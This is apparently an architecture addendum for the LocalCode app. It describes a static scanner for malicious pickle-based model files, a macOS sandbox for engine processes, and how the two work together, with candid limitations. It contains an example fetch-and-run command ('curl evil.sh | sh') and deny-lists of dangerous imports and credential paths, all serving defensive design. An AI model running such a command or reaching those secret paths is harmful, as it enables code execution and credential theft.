# LocalCode — model security (addendum to ARCHITECTURE.md)

Two independent, deliberately separate halves live under `localcode/security/`.
Neither is "antivirus" in the marketing sense — there is no signature database
of known-malware files anywhere in LocalCode — and the app never calls either
of them that. What exists instead:

| module | question it answers | when it runs |
|---|---|---|
| `localcode/security/scan.py` | *Before* anything reads a model's files, do they look safe? | Once, when the library discovers/rescans a model (download finishes, a local import, an explicit refresh, app startup). |
| `localcode/security/sandbox.py` | *While* the engine process is reading a model, what can it reach? | For the lifetime of every loaded engine subprocess. |

They are complementary, not redundant: the scanner is a best-effort static
check that can be wrong (see "What the scanner does not catch" below); the
sandbox is what limits the damage when it is. **Load a model exclusively
through GGUF/MLX weight formats via LocalCode's own engines, and the sandbox
is the layer actually doing the protecting; the scanner is what tells you
*before* that whether you should bother.**

---

## Part 1 — the scanner (`security/scan.py`)

### The concrete threat it targets

`.bin` / `.pt` / `.pth` / `.ckpt` (plain or PyTorch's zip-wrapped variant) and
`.pkl`/`.pickle` are Python **pickles**. Unpickling is not data
deserialisation: a pickle stream is a small stack program, and its `REDUCE`
opcode calls an arbitrary callable with arbitrary arguments. A file crafted as
`(os.system, ("curl evil.sh | sh",))` runs a shell command the moment
`pickle.load`/`torch.load` reads it — this is the standard way malicious
"models" on model-sharing sites get people to run code, not a theoretical
attack.

### What it does

* **Walks pickle opcodes without ever unpickling.** `pickletools.genops` reads
  the opcode stream; nothing in `scan.py` calls `pickle.load`, `torch.load` or
  `eval`. Every `GLOBAL`/`STACK_GLOBAL` (an import the pickle references) is
  recorded, and a `REDUCE` right after one marks that reference as *invoked*,
  not just imported.
* **Classifies each import** against a small allow-list (`torch`, `numpy`,
  `collections`, a handful of harmless builtins — the vocabulary a real
  `state_dict` needs) and a deny-list (`os`, `posix`, `nt`, `subprocess`,
  `shutil`, `socket`, `webbrowser`, `runpy`, `importlib`, and
  `builtins`/`__builtin__` `eval`/`exec`/`compile`/`__import__`). A denied
  import is **dangerous**; anything else not on the allow-list is
  **suspicious** — not proven harmful, but not something a checkpoint has any
  business importing either.
* **Looks inside archives** the same way: PyTorch's zip container
  (`torch.save` since 1.6, detected by magic bytes, not extension) and plain
  `.tar`/`.tar.gz`/`.tar.bz2`/`.tar.xz`, streaming each pickle member straight
  into the same opcode walk instead of extracting to disk first. A member path
  containing `..`, an absolute path, or a symlink pointing outside the archive
  is **dangerous** regardless of whether it is a pickle (path traversal).
* **File hygiene, unrelated to pickle:** a native executable (ELF/Mach-O/PE
  header, checked by magic bytes) has no reason to be in a model repo
  (**dangerous**); a `.py`/`.sh`/`.bash`/`.command`/`.ps1`/`.bat`/`.cmd` file,
  or a file with the executable bit set, is **suspicious** — LocalCode's own
  GGUF/MLX loaders never execute it, but another tool pointed at the same
  repo (notably `transformers` with `trust_remote_code=True`) might. A
  symlink resolving outside the scanned directory is **dangerous**. An
  unusually large non-weight, non-text helper file, or a repository with an
  unusually large file count, is **suspicious**.
* **Treats `.safetensors`, `.gguf` and MLX's `.npz` as what they are:** plain
  tensor data with no code path that executes anything when read. These are
  recognised **by extension alone and never opened** — a repository containing
  only such files gets a **clean** verdict *by construction*, not because
  nothing suspicious happened to be found. (`.npz` is, internally, a zip
  container of `.npy` arrays — the scanner deliberately does not look inside
  it either, exactly like `.safetensors`/`.gguf`: the extension is the
  decision, not the magic bytes.)
* **Streaming, bounded cost.** A pickle's own opcode stream is metadata
  (class refs, tensor shapes/dtypes, a handful of short strings) — the actual
  tensor bytes live outside it in every format PyTorch still writes, so a
  normal checkpoint's opcode stream is a few kilobytes and scans in
  milliseconds. Two independent budgets stop a crafted pickle from turning the
  scan itself into a resource sink: `MAX_PICKLE_OPCODES` (200,000 opcodes) and
  `MAX_PICKLE_BYTES` (32 MiB) on the *cumulative* bytes read from one pickle
  stream. Both are enforced **per call, not only as a running total**: the
  reader wrapping the file (`_BoundedReader`) caps the `size` argument of every
  individual `read()`/`readline()` *before* it reaches the underlying file, so
  a single opcode that declares an oversized length (e.g. `BINUNICODE8`'s
  attacker-controlled 8-byte count) or a stretch with no newline for a
  protocol-0 field cannot force one `read()`/`readline()` call to pull
  everything up to end-of-file into memory before the budget gets a chance to
  say no — every single call, not just the total, is bounded at
  `MAX_PICKLE_BYTES`. Files recognised as safe by extension
  (`.safetensors`/`.gguf`/`.npz`) are never opened at all beyond a 4-byte magic
  read used for the unrelated native-executable check — confirmed in
  `tests/security/test_scan.py` with a real 4 GiB sparse file, scanned in
  well under a second. Hitting either budget produces a **suspicious**
  "truncated" finding, never an exception and never an unbounded read.
* Exceeding the file-count budget (`MAX_FILES_SCANNED`, 20,000) or an
  archive's member-count budget (`MAX_ARCHIVE_MEMBERS`, 5,000) is itself
  reported as a finding, not silently applied.
* Malformed input (garbage bytes, a truncated archive, a pickle that is not
  actually a pickle) becomes a **suspicious** `parse_error` finding, never an
  unhandled exception — untrusted input must not be able to crash the scan.

### What the scanner deliberately does **not** do

Stated plainly, because an overstated security claim is worse than none:

* **It is not a full pickle interpreter.** It does not simulate the operand
  stack, so a `REDUCE` is attributed to "the most recently pushed
  `GLOBAL`/`STACK_GLOBAL`" — correct for every real checkpoint (a tensor is
  rebuilt by one reducer right after its class is pushed) but an
  approximation, not a proof, against a pickle deliberately built to confuse
  that heuristic.
* **It does not analyse `.h5`/`.hdf5`/`.msgpack`/`.joblib` contents** — joblib
  is pickle-based and a Keras `.h5` file can embed a `Lambda` layer's pickled
  code — those are flagged by extension only (`UNANALYZED_PICKLE_LIKE_EXTENSIONS`,
  always **suspicious**), never opcode-walked. Treat that verdict as "not
  cleared", not "checked".
* **It cannot catch** a dangerous import given a name that only *looks*
  innocuous, a vulnerability in `torch`/`numpy` themselves reachable through an
  otherwise-"allowed" reducer, or anything that only misbehaves once real
  tensor *values* (not the pickle structure) are used downstream.
* **It has no signature database.** There is no list of known-malicious file
  hashes anywhere in LocalCode; every verdict comes from structural analysis
  of the file in front of it, nothing else.
* **A "clean" verdict means "no known-bad pattern found in this file", not
  "guaranteed safe to run."** The sandbox (Part 2) is what limits the blast
  radius when a scan — this one or any other — misses something.
* **It is fail-open by design, not fail-closed.** `LocalModel.scan == None`
  means "not scanned yet" *or* "the scanner itself raised" — `ModelLibrary`
  swallows a scanner exception and logs it rather than letting it break a
  library scan (`ModelLibrary._security_scan`; a scanner bug must never brick
  a working setup, or block a library that predates this feature). Both cases
  are indistinguishable from each other and are treated identically to "not
  dangerous" everywhere downstream (Part 3). A scan that never happened and a
  scan that crashed both let the model load.
* **It is not a filesystem watcher.** The scan runs when the *library*
  rescans — app startup, right after a download finishes, right after a local
  import, or an explicit "Odśwież bibliotekę"/refresh — never persisted to
  disk between runs (unlike GGUF/MLX metadata, which is fingerprint-cached in
  `library-cache.json`, the security verdict is recomputed in full on every
  `ModelLibrary.scan()` call, so it can never go stale *between* rescans —
  but it also does not notice a file dropped into the models directory
  outside of one of those trigger points until the next rescan happens).

---

## Part 2 — the sandbox (`security/sandbox.py`, unmodified — read, not edited, for this doc)

Where the scanner asks "do these files look safe *before* anything opens
them", the sandbox answers a different question: once an engine process
(`llama-server` for GGUF, the MLX worker for MLX) is actually running and
parsing megabytes of attacker-supplied structure, what can a bug in that
parser actually reach? On macOS this is `sandbox-exec` (the mechanism behind
App Sandbox) applied to the engine subprocess, built and driven by
`RuntimeManager` (see `docs/ARCHITECTURE.md`).

### What it removes

* **No outbound network.** The profile denies `network*` outright and then
  allows only `network-bind`/`network-inbound` on `(local ip)` — the engine
  can serve LocalCode on a local port; it cannot make an outbound connection
  of any kind. A compromised loader cannot phone home or exfiltrate anything.
* **No writes outside a few directories the engine legitimately owns** — the
  configured models directory, LocalCode's own app-data directory, and the
  OS's per-user temp/cache directories (needed for llama.cpp's Metal shader
  cache; without write access there every launch recompiles kernels, turning
  a ~1 s load into tens of seconds). Everything else is unwritable.
* **No reads of the parts of your home directory that matter.** Reads are
  allowed broadly by default (an allow-list breaks the dynamic loader and the
  Metal stack before it protects anything) and then *denied* for a fixed list
  (`PRIVATE_PATHS()`): `Documents`, `Desktop`, `Downloads`, `Pictures`,
  `Movies`, `Music`, `.ssh`, `.aws`, `.gnupg`, `.config/gh`, `.kube`, the
  Keychain, Messages, Mail, Safari data, Chrome/Firefox profiles, `Containers`,
  `Cookies`. These simply are not there for the model, whatever a compromised
  parser tries to do.

### Modes (`settings.security.sandbox`)

| mode | behaviour |
|---|---|
| `auto` (default) | Sandbox when the platform supports it; if the sandboxed process cannot start, fall back to running unsandboxed and say so in the logs and the runtime status. |
| `strict` | Sandbox or refuse to load the model at all (`SandboxUnavailable`). |
| `off` | No sandbox — debugging, or a platform without one. |

### What it deliberately does **not** do

* **It is macOS-only.** `available()` requires `platform.system() == "Darwin"`
  and `/usr/bin/sandbox-exec` on disk. On any other platform, `auto` silently
  runs every engine unsandboxed (logged and reflected in
  `describe()`/the runtime status — not silent to the user, just not blocking).
* **It is not a virtual machine.** A kernel vulnerability defeats it; this is
  process-level containment (macOS Seatbelt), not hardware isolation.
* **It does not restrict what the engine does with files it may legitimately
  read** — most importantly, the model's own files. If a `.gguf`/`.safetensors`
  parser itself has a memory-safety bug that an attacker can turn into
  arbitrary code execution using nothing but the model file the engine was
  already going to read, the sandbox limits *where that code can go*
  (no network, no writes outside its own directories, none of your private
  files) — it does not prevent the bug from being triggered in the first
  place. That is what Part 1's static check is for, on the one format
  (pickle) that is *guaranteed* to run code just by being read; it says
  nothing about a parser bug in a format that has no such guarantee.
* **It protects the rest of the machine, not the model process against
  itself.** Nothing here stops the model from producing bad output, using a
  lot of RAM/CPU/GPU, or (within its own writable directories) filling the
  disk.

---

## Part 3 — how the two halves are wired together

### Where the scan runs automatically

`ModelLibrary._security_scan` (`localcode/hub/library.py`) calls
`security.scan.scan_path()` once per discovered model, during
`ModelLibrary.scan()`. It scans the **directory** the model's weight file(s)
live in — the MLX directory itself, or the folder containing a GGUF shard —
not just the recognised weight file, so a stray script or a pickle payload
bundled *next to* otherwise-safe weights is still caught even though nothing
would ever ask to load that file directly (verified in
`tests/hub/test_security_scan_wiring.py` with exactly that shape: a clean
GGUF file plus a sibling malicious pickle in the same downloaded directory).
Several `LocalModel`s that share one directory (GGUF quant variants, a vision
projector next to its base model) share one scan per `ModelLibrary.scan()`
call rather than re-scanning the same files repeatedly. A scanner exception is
caught and logged; the model still gets built, with `scan=None` (see "fail-open"
above).

`ModelLibrary.scan()` — and therefore the security scan — runs from:

* **App/server startup** (`server/core.py: ServerCore.open()`).
* **Right after a local import** — `ModelLibrary.import_path()` calls
  `self.scan()` as its last step, so an imported MLX directory (which is
  copied in full, `shutil.copytree`) or a `.gguf` import is scanned before the
  new `LocalModel` is even returned to the caller. Verified end-to-end in
  `tests/hub/test_security_scan_wiring.py::test_import_path_scans_an_mlx_directory_and_flags_a_bundled_payload`.
* **Right after a download finishes** — `DownloadManager.on_complete`
  (`localcode/hub/download.py`) is a generic "a job finished" hook; the
  production wiring that turns it into a rescan is
  `server/core.py: ServerCore._on_download_complete` → `rescan_library()` →
  `ModelLibrary.scan()` (owned by another part of the app, outside
  `localcode/hub/`, verified here by reading that code path, not by starting
  a full server in a test). What is verified directly, in
  `tests/hub/test_security_scan_wiring.py`, is the part that does the actual
  analysis: `ModelLibrary.scan()` computing the correct verdict for the exact
  directory layout a finished download leaves on disk, with the model's key
  cross-checked against `download.py`'s own `job_model_key()` so "the scan
  ran" is provably attached to the model the UI will actually show.
* **An explicit refresh** — `POST /api/library/rescan`, used by
  `list_models(refresh=True)` in both the CLI (`cli.py`, after `import`) and
  the TUI (`tui/models_ui.py`, after every download completes) specifically
  so the freshly computed `scan` verdict is available to show a warning
  immediately.

### Where a "dangerous" verdict is surfaced

* **CLI** (`localcode import`) and **TUI** (after any download) print a
  Polish warning line (`⚠ {summary}`) for `dangerous` (red) and `suspicious`
  (yellow) verdicts; nothing is hidden from the person doing the import or
  download.
* **`LocalModel.to_dict()`** includes the full `scan` DTO (camelCase:
  `verdict`, `summary`, `findings[]`, `filesScanned`, `filesSkipped`,
  `pickleFilesAnalyzed`, `target`, `scannedAt`) so the Mac app can render the
  same information.

### Where a "dangerous" verdict actually blocks loading

`RuntimeManager._check_security_scan` (`localcode/runtime/manager.py`), called
from `_start_instance` — i.e. **once per new engine process being spawned**,
not on every request against an already-running instance:

* `scan is None` (not scanned yet, or the scanner failed) never blocks —
  see "fail-open" above.
* `scan["verdict"] in ("clean", "suspicious")` never blocks — "suspicious" is
  a warning shown elsewhere (CLI/TUI/UI), not a load-time gate.
* `scan["verdict"] == "dangerous"` raises `EngineError` **before spawning the
  process**, with a Polish message built from the scan's own summary, e.g.:

  > Model „…” nie został wczytany ze względów bezpieczeństwa: Wykryto
  > niebezpieczne elementy w plikach modelu (liczba: 1) — wczytanie mogłoby
  > uruchomić kod. Jeśli mimo to chcesz go uruchomić, wczytaj go ręcznie w
  > panelu Runtime z opcją „wczytaj mimo to” (allowDangerous).

* The **explicit override** is `LoadConfig.allow_dangerous` /
  `LoadConfig.to_dict()["allowDangerous"]` — false everywhere except an
  explicit "load anyway" from the UI/CLI/API — round-tripped through
  `LoadConfig.from_dict()`, so it is a real field of the load-request DTO, not
  an internal-only flag. Once used for a given model key, the override is
  remembered for the process's lifetime (`RuntimeManager._dangerous_overridden`,
  **never persisted to disk**), so scaling up an already-overridden model or
  reloading it with a different context does not ask again; it does not
  extend to any other model, dangerous or not.

Verified end-to-end (blocking, the exact message, the override, its
per-model-key stickiness, and that "suspicious"/"clean"/unscanned all still
load normally) in `tests/runtime/test_security_scan_gate.py`.

**Important limitation, stated plainly:** the gate fires only when a *new*
engine process is about to be spawned. It does not retroactively act on an
instance that is already running, and it does not re-check a model between
one `ModelLibrary.scan()` and the next — if the files under an already-loaded
model's directory change after it was loaded (or after the last rescan), that
change is not noticed, and therefore does not block anything, until the
library rescans again.

---

## Fix made while writing the test suite for this document

While writing `tests/security/test_scan.py`'s streaming-behaviour tests, one
gap was found and fixed directly in `security/scan.py` (in scope for this
work; `security/sandbox.py` was read but intentionally left unmodified — see
Part 2's header):

`_BoundedReader` was enforcing `MAX_PICKLE_BYTES` only as a **running total,
checked after each `read()`/`readline()` returned** — not as a cap on the
*size requested by a single call*. A pickle opcode that declares its own
field length (`BINUNICODE8`'s attacker-controlled 8-byte count, in
particular) hands that declared length straight to one `read(n)` call; with
the old code, a single such opcode in front of a genuinely large file could
make that one call read everything up to end-of-file before the budget check
ever got a chance to say no — reproduced with a synthetic 60 MiB declared
field, which pulled the full ~60 MiB into memory in one call (nearly double
`MAX_PICKLE_BYTES`'s 32 MiB) before being flagged. The same shape existed for
protocol-0 opcodes (`STRING`/`PUT`/`GET`/…), which read a newline-terminated
field via a bare `readline()` with no size at all — a stream with no newline
for a long stretch had the same unbounded-single-call problem.

The fix caps the `size` argument of every `read()`/`readline()` call to the
*remaining* budget before it reaches the underlying file object, so a single
oversized field now produces a short read (which `pickletools` itself then
reports as "not enough bytes", caught as the existing `parse_error` path)
instead of one unbounded read. Both cases are now covered by regression
tests (`test_single_opcode_claiming_a_huge_length_is_still_bounded`,
`test_no_newline_run_does_not_read_past_the_budget` in
`tests/security/test_scan.py`), which assert directly on the largest single
`read()`/`readline()` size that ever reached the underlying file, not just on
the final verdict.

A second, unrelated gap was found and fixed in `localcode/hub/library.py`:
`SecuritySettings.scan_downloads` (`localcode/config.py`, default `True`) is
documented there as "Scan a model's files after it is downloaded or
imported" but was **never actually read anywhere** — the scan ran
unconditionally regardless of the setting, meaning turning it off had no
effect at all. `ModelLibrary._security_scan` now checks it (skipping the scan
and returning `scan=None` — the same "not scanned" shape a disabled scanner
already had — when it is off), covered by
`test_scan_downloads_setting_is_honoured` and
`test_scan_downloads_defaults_to_on` in
`tests/hub/test_security_scan_wiring.py`.

---

## Summary: what this buys you, precisely

Downloading and loading a model that turns out to be malicious can still hurt
you in ways neither half of this catches: a scan can be fooled by an
opcode-stack heuristic that is not a full interpreter, and a sandboxed engine
process can still be a bad neighbour to itself (bad output, resource use) or
be defeated by a kernel bug. What the two halves together are built to
prevent, specifically:

* A poisoned pickle checkpoint running a shell command or arbitrary Python
  the moment it is loaded — caught by the scanner, *before* anything reads it,
  in the overwhelming majority of realistic cases (a straightforward
  `os.system`/`eval`/`subprocess` reducer, the way real-world malicious models
  have actually shipped).
* A `safetensors`/`GGUF`/MLX-`npz`-only model — which cannot execute anything
  by construction — never being slowed down or falsely flagged, because those
  formats are recognised by extension and never opened.
* Even if a parser bug in a *safe-by-construction* format turns out to be
  exploitable after all, or the scanner's heuristics are defeated by a
  pickle built specifically to do so: no outbound network, no writes outside
  the engine's own directories, and none of your Documents/Desktop/keys/
  Keychain/browser data are reachable from the process that just read it.
